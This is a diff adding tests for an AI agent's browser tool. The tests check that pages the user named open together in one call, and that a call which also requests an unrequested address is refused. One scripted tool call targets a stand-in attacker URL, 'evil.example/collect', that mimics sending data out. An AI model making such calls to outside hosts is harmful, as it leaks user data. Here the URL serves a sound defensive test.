@@ -192,6 +192,37 @@ export async function runAgentComputerChecks(check) {
         toolReplies(ai.calls[3]).some((reply) => reply.includes("You can only open an address the person wrote")),
     );
 
+    /* ---------------- several pages at once ---------------- */
+
+    ai.calls.length = 0;
+    browser.asked.length = 0;
+    ai.install([
+      chat("", [{ name: OPEN_PAGE_TOOL, args: { urls: ["https://example.com/pricing", "https://example.com/teams"] } }]),
+      chat("Both."),
+    ]);
+    await ask(env, TOKEN_TEXTS, { question: "Compare example.com/pricing and example.com/teams" });
+    check(
+      "pages the person named open together in one step",
+      browser.asked.length === 2 &&
+        ai.calls.length === 2 &&
+        toolReplies(ai.calls[1]).some((reply) => reply.includes("Pro is $12") && reply.includes("Teams is $40")),
+    );
+
+    ai.calls.length = 0;
+    browser.asked.length = 0;
+    ai.install([
+      chat("", [{ name: OPEN_PAGE_TOOL, args: { urls: ["https://example.com/pricing", "https://evil.example/collect?q=x"] } }]),
+      chat("", [{ name: OPEN_PAGE_TOOL, args: { urls: ["https://example.com/pricing", "https://example.com/teams"] } }]),
+      chat("Done."),
+    ]);
+    await ask(env, TOKEN_TEXTS, { question: "Check example.com/pricing" });
+    check(
+      "one address it was not given refuses the whole call, and a link cannot vouch for a page opened beside it",
+      browser.asked.length === 0 &&
+        toolReplies(ai.calls[1]).some((reply) => reply.includes("You can only open")) &&
+        toolReplies(ai.calls[2]).filter((reply) => reply.includes("You can only open")).length === 2,
+    );
+
     /* ---------------- who gets a computer ---------------- */
 
     // The app's own agent panel: same person, another client, no computer.
